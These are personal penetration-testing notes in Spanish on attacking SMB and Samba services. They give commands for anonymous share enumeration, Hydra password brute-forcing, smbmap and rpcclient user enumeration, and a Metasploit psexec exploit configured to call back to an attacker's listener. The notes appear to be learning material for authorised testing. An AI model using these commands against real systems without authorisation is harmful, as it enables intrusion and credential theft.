**SMB -> windows**
protocolo que usa windows para compartir recursos y ejecutar, practicamente
leer, escribir, ejecutar remotamente con otras computadoras windows

primero intentamos si podemos listar los recursos compartidos sin login
```
smbclient -L ip -N
-L: lista de recursos compartidos
-N: login anonimo sin contraseña
```
lo normal es que no se pueda, por otro lado si tenemos el nombre de un usuario:
ataque de fuerza bruta
```
hydra -l user -P rockyou.txt smb://ip
```
obtenido la contraseña
```
smbclient -L ip -U 'user' --password='password'
```
SMBMAP es mas avanzado
```
smbmap -H ip -u 'user' -p 'password'
te puede listar hasta los permisos
```
al ver los recursos compartidos puede adentrarte
```
smbclient -U 'user' --password='password' //ip/recurso 
```
----------------------------------------------------------------
***CON METASPLOIT***
```
use auxiliary/scanner/smb/smb_login
personalizar:
set SMBUser usuario
set RPORT puerto
set RHOST ip
set PASS_FILE diccionario
set THREADS 1 -> 1 por host
en caso de equivocarte
unset PARAMETRO
run
```
una vez obtenido las credenciales:
podriamos intentar conectar conexion por medio de PSEXEC
```
use exploit/windows/smb/psexec
set RHOST ip
set RPORT puerto
set LHOST mi_ip
set LPORT mi_puerto_escucha
set SMBUser usuario
set SMBPass contraseña
set payload ...
run
```
si funciona es porque tenian corriendo el PSEXEC:
**PsExec** es una herramienta de Microsoft Sysinternals que permite ejecutar comandos de manera remota en otros sistemas Windows. Se usa principalmente para administrar redes y realizar tareas de administración remota sin la necesidad de acceder físicamente a los dispositivos o de iniciar sesión en ellos. PsExec es muy útil para administradores de sistemas y también se utiliza en pruebas de penetración para verificar permisos y vulnerabilidades en redes.

----------------------------------------------------------------

**SAMBA -> linux**
linux una protocolo SAMBA para comunicarse con windows que utiliza SMB

intentamos enumerar `usuarios`
```
rpcclient -U "" -N ip
-U: establece nombre de usuario en la red, "" vacio
-N: no pide contraseña
```
usaremos 3 comandos
```
rpcclient $> srvinfo : informacion de consulta al servidor
rpcclient $> querydispinfo : informacion de de la pantalla de consulta
rpcclient $> enumdomusers : enumera los usuarios del dominio
```
METASPLOIT
```
use scanner/smb/smb_login
set RHOST
set PASS_FILE
set SMBUser
```
verbose es mejor false, para que sea mas rapido

podemos usar smbmap para enumerar recursos compartidos
```
smbmap -u "user" -p "password" -H ip
```
para entrar a un recurso compartido
```
smbmap -u "user" -p "password" -H ip -r recurso
```

